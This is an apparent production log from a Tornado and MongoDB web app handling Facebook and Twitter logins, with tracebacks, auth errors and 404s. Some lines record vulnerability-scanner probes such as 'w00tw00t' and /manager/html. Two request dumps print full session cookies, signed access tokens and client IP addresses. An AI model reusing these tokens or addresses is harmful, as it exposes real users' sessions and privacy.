  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 87, in _save_user_profile
    c_user.gender = response['gender']
KeyError: 'gender'
ERROR:root:Exception after headers written
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 964, in wrapper
    return callback(*args, **kwargs)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/auth.py", line 1089, in _on_facebook_request
    callback(escape.json_decode(response.body))
  File "/www/virtualenv/intheory/src/app/handlers/user.py", line 106, in _save_user_friends
    c_user.save()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/document.py", line 184, in save
    self.validate()
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/mongoengine/base.py", line 907, in validate
    raise ValidationError('ValidationError', errors=errors)
ValidationError: ValidationError(Field is required: ['fb_id'])
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
Facebook user with id 507306798e4c8505b2845def has successfully logged in.
INFO:intheory-8000:Facebook user with id 507306798e4c8505b2845def has successfully logged in.
Facebook user with id 507306798e4c8505b2845def has successfully logged in.
INFO:intheory-8000:Facebook user with id 507306798e4c8505b2845def has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Facebook user with id 507306798e4c8505b2845def has successfully logged in.
INFO:intheory-8002:Facebook user with id 507306798e4c8505b2845def has successfully logged in.
Facebook user with id 507306798e4c8505b2845def has successfully logged in.
INFO:intheory-8001:Facebook user with id 507306798e4c8505b2845def has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8000:Facebook user with id None has successfully logged in.
Facebook user with id 50730ff98e4c8506601e064d has successfully logged in.
INFO:intheory-8000:Facebook user with id 50730ff98e4c8506601e064d has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
WARNING:root:404 GET /learn/undefined.mp4 (127.0.0.1) 1.36ms
WARNING:root:404 GET /learn/undefined.webm (127.0.0.1) 1.24ms
WARNING:root:404 GET /learn/undefined.mp4 (127.0.0.1) 1.17ms
WARNING:root:404 GET /learn/undefined.webm (127.0.0.1) 1.18ms
Facebook user with id 506f10448e4c85661e8a13f0 has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f10448e4c85661e8a13f0 has successfully logged in.
Facebook user with id 506f10448e4c85661e8a13f0 has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f10448e4c85661e8a13f0 has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8002:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8000:Facebook user with id None has successfully logged in.
Facebook user with id 507314f08e4c8506601e0653 has successfully logged in.
INFO:intheory-8000:Facebook user with id 507314f08e4c8506601e0653 has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8000:Facebook user with id None has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8002:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8002:Ajax request failed.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
HTTP 403: Forbidden
ERROR:intheory-8001:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 189.04ms
HTTP 403: Forbidden
ERROR:intheory-8000:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 196.56ms
HTTP 403: Forbidden
ERROR:intheory-8003:HTTP 403: Forbidden
WARNING:root:403 POST /admin/users/moderator (127.0.0.1) 205.12ms
WARNING:root:405 HEAD / (127.0.0.1) 2.95ms
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
Facebook user with id 5074078a8e4c850675407c10 has successfully logged in.
INFO:intheory-8003:Facebook user with id 5074078a8e4c850675407c10 has successfully logged in.
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8000:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (88.84.210.234) 0.90ms
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8003:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8002:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8000:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8001:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8000:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8000:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
Facebook user with id 507429cb8e4c85066d91f116 has successfully logged in.
INFO:intheory-8002:Facebook user with id 507429cb8e4c85066d91f116 has successfully logged in.
Facebook user with id 507314f08e4c8506601e0653 has successfully logged in.
INFO:intheory-8001:Facebook user with id 507314f08e4c8506601e0653 has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8001:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8001:Ajax request failed.
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Facebook user with id 507314f08e4c8506601e0653 has successfully logged in.
INFO:intheory-8001:Facebook user with id 507314f08e4c8506601e0653 has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8000:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8000:Ajax request failed.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
WARNING:root:404 GET /learn/undefined.webm (127.0.0.1) 1.20ms
WARNING:root:404 GET /learn/undefined.mp4 (127.0.0.1) 1.11ms
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8000:Facebook user with id None has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8002:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8002:Ajax request failed.
ERROR:root:Uncaught exception GET / (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-us', 'Accept-Encoding': 'gzip, deflate', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_2) AppleWebKit/536.26.14 (KHTML, like Gecko) Version/6.0.1 Safari/536.26.14', 'Connection': 'close', 'Cookie': '_xsrf=854f69eb96354fc7b688f7ff8d1bca94; access_token="QUFBRzZsTmNzNkdjQkFMZ0RqZ25ib2Z5TGJuMERlTVpCTWF1UGtweDl6VHUwWkJwQmNlTW15UHR5TU50QVpDWkFJWkJFY2dzQmxXTVNHTDFMYk9OdnA4bHNIRTdhcmdNb1dIdUVzaVRTTFpDQVpEWkQ=|1347979391|df4c5aa7bb47e6904e992049551c587e819b6a02"; __utma=188782963.661404563.1347979360.1347979360.1347979360.1; __utmz=188782963.1347979360.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Real-Ip': '109.155.226.124'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 211, in _execute_request
    msg = ex.message.encode("utf-8")
AttributeError: 'NoneType' object has no attribute 'encode'
ERROR:root:500 GET / (127.0.0.1) 71.31ms
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8000:Facebook user with id None has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Facebook user with id 507451478e4c8506601e066e has successfully logged in.
INFO:intheory-8000:Facebook user with id 507451478e4c8506601e066e has successfully logged in.
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8000:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8001:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
WARNING:root:404 GET /images/sp.gif (127.0.0.1) 1.17ms
WARNING:root:404 GET /images/sp.gif (127.0.0.1) 1.31ms
None is not a valid ObjectId
ERROR:intheory-8000:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8000:Ajax request failed.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
None is not a valid ObjectId
ERROR:intheory-8000:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8000:Ajax request failed.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
WARNING:root:404 GET /practise/main (127.0.0.1) 1.60ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8002:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Server started successfully.
Twitter user with id 506f15c68e4c8572883f943d has successfully logged in.
INFO:intheory-8002:Twitter user with id 506f15c68e4c8572883f943d has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8003:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8003:Ajax request failed.
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8003:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Missing OAuth request token cookie
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:intheory-8001:Error while creating a new <class 'app.model.content.PractiseTest'> : ValidationError(Field is required and cannot be empty: ['questions'])
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (88.84.210.234) 0.79ms
WARNING:root:404 GET /verify.txt (127.0.0.1) 0.78ms
WARNING:root:404 GET /api/status (127.0.0.1) 1.21ms
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
Facebook user with id 50753b0f8e4c850ee5d0a5f5 has successfully logged in.
INFO:intheory-8003:Facebook user with id 50753b0f8e4c850ee5d0a5f5 has successfully logged in.
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8000:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8000:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
Facebook user with id 50753bd98e4c850ee2828b43 has successfully logged in.
INFO:intheory-8002:Facebook user with id 50753bd98e4c850ee2828b43 has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
Facebook user with id 50753c6c8e4c850ee5d0a5f9 has successfully logged in.
INFO:intheory-8003:Facebook user with id 50753c6c8e4c850ee5d0a5f9 has successfully logged in.
HTTP 403: Forbidden
ERROR:intheory-8003:HTTP 403: Forbidden
WARNING:root:403 POST /test/delete (127.0.0.1) 6.82ms
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Section matching query does not exist.
WARNING:intheory-8000:Section matching query does not exist.
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8003:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
Facebook user with id 506f10448e4c85661e8a13f0 has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f10448e4c85661e8a13f0 has successfully logged in.
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8003:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8001:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8003:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8000:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8003:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8000:Facebook user with id None has successfully logged in.
Facebook user with id 50757d968e4c850ed6a6de3b has successfully logged in.
INFO:intheory-8000:Facebook user with id 50757d968e4c850ed6a6de3b has successfully logged in.
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8000:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8003:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:root:Could not fetch access token
Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
WARNING:intheory-8002:Error while authenticating Twitter user: HTTP 500: Internal Server Error (Twitter auth failed)
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8000:Facebook user with id None has successfully logged in.
Facebook user with id 507585278e4c850ed6a6de43 has successfully logged in.
INFO:intheory-8000:Facebook user with id 507585278e4c850ed6a6de43 has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
Facebook user with id 5075a3618e4c850ee2828b52 has successfully logged in.
INFO:intheory-8002:Facebook user with id 5075a3618e4c850ee2828b52 has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
None is not a valid ObjectId
ERROR:intheory-8001:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8001:Ajax request failed.
WARNING:root:404 HEAD /manager/html (127.0.0.1) 0.85ms
Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
WARNING:intheory-8003:Error while authenticating Twitter user: Tried to save duplicate unique keys (E11000 duplicate key error index: intheory_dev.Users.$email_1  dup key: { : null })
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
Facebook user with id 5075baef8e4c850ee5d0a610 has successfully logged in.
INFO:intheory-8003:Facebook user with id 5075baef8e4c850ee5d0a610 has successfully logged in.
WARNING:root:404 GET /hq/ (127.0.0.1) 1.26ms
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (88.84.210.234) 0.81ms
None is not a valid ObjectId
ERROR:intheory-8003:None is not a valid ObjectId
Ajax request failed.
ERROR:intheory-8003:Ajax request failed.
WARNING:root:404 GET /dashboar (127.0.0.1) 0.79ms
WARNING:root:404 GET /d (127.0.0.1) 1.19ms
A new Facebook user is trying to login.
INFO:intheory-8003:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8003:Facebook user with id None has successfully logged in.
Facebook user with id 5075e2968e4c850ee5d0a616 has successfully logged in.
INFO:intheory-8003:Facebook user with id 5075e2968e4c850ee5d0a616 has successfully logged in.
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 0.39ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.27ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 1.33ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.22ms
WARNING:root:404 GET /apple-touch-icon-precomposed.png (127.0.0.1) 0.39ms
WARNING:root:404 GET /apple-touch-icon.png (127.0.0.1) 1.26ms
Facebook user with id 5075e2968e4c850ee5d0a616 has successfully logged in.
INFO:intheory-8003:Facebook user with id 5075e2968e4c850ee5d0a616 has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8003:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8001:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
WARNING:root:405 HEAD / (127.0.0.1) 0.73ms
A new Facebook user is trying to login.
INFO:intheory-8000:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8000:Facebook user with id None has successfully logged in.
Facebook user with id 50762faa8e4c850ed6a6de48 has successfully logged in.
INFO:intheory-8000:Facebook user with id 50762faa8e4c850ed6a6de48 has successfully logged in.
WARNING:root:404 HEAD /manager/status (127.0.0.1) 0.80ms
WARNING:root:404 GET /w00tw00t.at.ISC.SANS.DFind:) (88.84.210.234) 0.80ms
Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
INFO:intheory-8003:Facebook user with id 506effd18e4c8564abe4192a has successfully logged in.
Facebook user with id 5072af228e4c855a1202148c has successfully logged in.
INFO:intheory-8003:Facebook user with id 5072af228e4c855a1202148c has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8002:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8002:Facebook user with id None has successfully logged in.
Facebook user with id 5076b5b38e4c850ee2828b57 has successfully logged in.
INFO:intheory-8002:Facebook user with id 5076b5b38e4c850ee2828b57 has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8001:Facebook user with id None has successfully logged in.
HTTP 403: Forbidden
ERROR:intheory-8000:HTTP 403: Forbidden
WARNING:root:403 POST /test/delete (127.0.0.1) 5.96ms
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8001:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
A new Facebook user is trying to login.
INFO:intheory-8001:A new Facebook user is trying to login.
Facebook user with id None has successfully logged in.
INFO:intheory-8001:Facebook user with id None has successfully logged in.
Facebook user with id 5076d1158e4c850ed779698c has successfully logged in.
INFO:intheory-8001:Facebook user with id 5076d1158e4c850ed779698c has successfully logged in.
Facebook user with id 5076bba68e4c850ed7796986 has successfully logged in.
INFO:intheory-8000:Facebook user with id 5076bba68e4c850ed7796986 has successfully logged in.
Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f11498e4c856632c26f44 has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8000:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
INFO:intheory-8002:Facebook user with id 506f07f98e4c856632c26f3f has successfully logged in.
Facebook user with id 5075a3618e4c850ee2828b52 has successfully logged in.
INFO:intheory-8001:Facebook user with id 5075a3618e4c850ee2828b52 has successfully logged in.
Error while fetching new question: list index out of range
WARNING:intheory-8002:Error while fetching new question: list index out of range
ERROR:root:Uncaught exception GET /test/get-next?tid=5076f01a8e4c850ee2828b5d&answers=%5B2%5D&cursor=19&_xsrf=09382964679f4272968cfad6a363f3e4 (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='GET', uri='/test/get-next?tid=5076f01a8e4c850ee2828b5d&answers=%5B2%5D&cursor=19&_xsrf=09382964679f4272968cfad6a363f3e4', version='HTTP/1.0', remote_ip='127.0.0.1', body='', headers={'Accept-Language': 'en-GB, en-US', 'Accept-Encoding': 'gzip', 'X-Ee-Client-Ip': '10.32.77.232', 'X-Scheme': 'http', 'X-Nokia-Ipaddress': '10.32.77.232', 'Accept-Charset': 'utf-8, iso-8859-1, utf-16, *;q=0.7', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'X-Ee-Brand-Id': '2', 'X-Real-Ip': '213.205.235.87', 'X-Orange-Roaming': 'NO', 'X-Orange-Rat': '1', 'X-Wap-Profile': 'http://uaprof.motorola.com/phoneconfig/MotoMB525/profile/MotoMB525.rdf', 'X-Nokia-Bearer': 'GPRS', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.2.2; en-gb; MB525 Build/3.4.2-177) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1', 'Host': 'www.intheory.co.uk', 'Referer': 'http://www.intheory.co.uk/test/new?sid=50748f9a8e4c850b10a52e40', 'Cache-Control': 'max-age=43200', 'Cookie': '_xsrf=09382964679f4272968cfad6a363f3e4; access_token=QUFBRzZsTmNzNkdjQkFMVkZIRFRQWkNHbHFHbmFEVzFERnFaQVRjbWxaQU9yMkY2d21TU0VaQTRJZmdUWkNqTTdXMmZMdnE4NHlaQk9PMmhVQWx4ZFlyMk1mMjZhNlpCanRGaXgzTDZ4MFU1WHdaRFpE|1349971931|23ac9ffccfd651380af34f498ac5bbe1677af668; user_type="ZmI=|1349971931|a146b81bbf585d49c6630086aa71a9ac4f89b848"; __utma=188782963.131854014.1349972214.1349972214.1349972214.1; __utmb=188782963.5.10.1349972214; __utmc=188782963; __utmz=188782963.1349972214.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'X-Operator-Domain': 'orange.co.uk'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 88, in get
    self._execute_request(self.on_get, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 215, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 220, in _execute_on_success
    self.on_success(*result)
TypeError: on_success() takes exactly 3 arguments (1 given)
